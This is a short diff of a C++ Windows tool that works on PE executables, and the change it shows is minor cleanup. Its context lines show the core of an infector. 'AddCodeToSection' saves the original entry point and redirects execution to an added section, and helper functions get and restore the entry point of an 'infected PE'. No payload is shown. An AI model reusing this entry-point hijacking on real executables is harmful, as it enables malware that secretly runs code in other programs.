@@ -9,7 +9,7 @@
 #include <filesystem>
 #include <sys/stat.h>
 #pragma comment(lib, "User32.lib")
-extern DWORD dwEntryPoint = 0;
+
 
 //align address
 DWORD align(DWORD size, DWORD align, DWORD addr) {
@@ -117,8 +117,6 @@ bool AddCodeToSection(LPCSTR filepath, char const* sectionName) {
 	SetFilePointer(file, 0, 0, FILE_BEGIN);
 	//lets save the OEP
 	DWORD OEP = nt->OptionalHeader.AddressOfEntryPoint + nt->OptionalHeader.ImageBase;
-	// save entry point to global variable
-	dwEntryPoint = OEP;
 	
 	//we change the EP to point to the last section created
 	nt->OptionalHeader.AddressOfEntryPoint = last->VirtualAddress;
@@ -342,7 +340,6 @@ bool AddCodeToSection(LPCSTR filepath, char const* sectionName) {
 	return true;
 }
 
-
 //get entry point of the infected PE
 DWORD getOEP(LPCSTR file) {
 	HANDLE hFile = CreateFileA(file, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
@@ -359,7 +356,6 @@ DWORD getOEP(LPCSTR file) {
 	return nt.OptionalHeader.AddressOfEntryPoint;
 }
 
-	
 // restore entry point of infected PE to original value 
 bool restoreEP(LPCSTR file, DWORD OEP) {
 	HANDLE hFile = CreateFileA(file, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
@@ -422,6 +418,7 @@ void printHeaders(PIMAGE_OPTIONAL_HEADER pOptionalHeader) {
 	printf("Size of image : %08X\n", pOptionalHeader->SizeOfImage);
 	printf("\n");
 }
+
 bool DumpPEHeader(LPCSTR filename)
 {
 	HANDLE hFile;
